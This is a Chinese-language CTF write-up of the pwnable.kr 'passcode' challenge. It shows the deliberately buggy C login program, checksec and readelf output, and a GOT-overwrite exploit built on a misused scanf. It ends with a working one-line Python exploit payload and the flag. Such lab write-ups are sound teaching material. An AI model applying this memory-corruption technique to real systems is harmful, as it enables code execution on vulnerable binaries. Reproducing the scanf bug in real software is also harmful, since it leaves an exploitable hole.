---
title: "pwnable.kr passcode"
Categories:
    - Pwn
tag: 
    - Pwn
    - Writeup
    - Pwnable.kr
---

> Mommy told me to make a passcode based login system.  
> My initial C code was compiled without any error!  
> Well, there was some compiler warning, but who cares about that?  
>
> ssh passcode@pwnable.kr -p2222 (pw:guest)  

<!-- more -->

源代码如下：

```c
#include <stdio.h>
#include <stdlib.h>

void login(){
    int passcode1;
    int passcode2;

    printf("enter passcode1 : ");
    scanf("%d", passcode1);
    fflush(stdin);

    // ha! mommy told me that 32bit is vulnerable to bruteforcing :)
    printf("enter passcode2 : ");
        scanf("%d", passcode2);

    printf("checking...\n");
    if(passcode1==338150 && passcode2==13371337){
                printf("Login OK!\n");
                system("/bin/cat flag");
        }
        else{
                printf("Login Failed!\n");
        exit(0);
        }
}

void welcome(){
    char name[100];
    printf("enter you name : ");
    scanf("%100s", name);
    printf("Welcome %s!\n", name);
}

int main(){
    printf("Toddler's Secure Login System 1.0 beta.\n");

    welcome();
    login();

    // something after login...
    printf("Now I can safely trust you that you have credential :)\n");
    return 0;
}
```

我们可以很明显的看见 login() 函数中 scanf() 写错了。`scp -P 2222 passcode@pwnable.kr:passcode ./` 把二进制文件down下来看了看发现 passcode1 就是 name[] 的最后4个字节。因此我们有了一次向任意地址写入4 bytes的机会。

![img_1](/images/posts/pwnable.kr/passcode_1.png)
![img_2](/images/posts/pwnable.kr/passcode_2.png)

用 checksec 查看一下保护。

```shell
root@ubuntu:~# checksec passcode
[*] '/root/passcode'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

现在我的想法是通过修改GOT表来控制EIP，GOT表的相关知识可以看看我写的[GOT与PLT](https://demonsin.github.io/2018/06/GOT%E4%B8%8EPLT/)。

我们将目标代码 `system("/bin/cat flag");` 的地址覆盖掉GOT表中 printf() 的地址。这样接下来调用 printf() 时就会跳到目标代码去了。

用 `readelf -r passcode` 看见 printf() 在 GOT表中的地址为 0x0804a000。在 IDA 中看到目标地址为 0x080485E3，即十进制的 134514147。

```shell
root@ubuntu:~# readelf -r passcode

Relocation section '.rel.dyn' at offset 0x388 contains 2 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
08049ff0  00000606 R_386_GLOB_DAT    00000000   __gmon_start__
0804a02c  00000b05 R_386_COPY        0804a02c   stdin@GLIBC_2.0

Relocation section '.rel.plt' at offset 0x398 contains 9 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
0804a000  00000107 R_386_JUMP_SLOT   00000000   printf@GLIBC_2.0
0804a004  00000207 R_386_JUMP_SLOT   00000000   fflush@GLIBC_2.0
0804a008  00000307 R_386_JUMP_SLOT   00000000   __stack_chk_fail@GLIBC_2.4
0804a00c  00000407 R_386_JUMP_SLOT   00000000   puts@GLIBC_2.0
0804a010  00000507 R_386_JUMP_SLOT   00000000   system@GLIBC_2.0
0804a014  00000607 R_386_JUMP_SLOT   00000000   __gmon_start__
0804a018  00000707 R_386_JUMP_SLOT   00000000   exit@GLIBC_2.0
0804a01c  00000807 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0
0804a020  00000907 R_386_JUMP_SLOT   00000000   __isoc99_scanf@GLIBC_2.7
```

![img_3](/images/posts/pwnable.kr/passcode_3.png)

exp: `python -c "print 'A' * 96 + '\x00\xa0\x04\x08' + '134514147\n'" | ./passcode`

flag: Sorry mom.. I got confused about scanf usage :(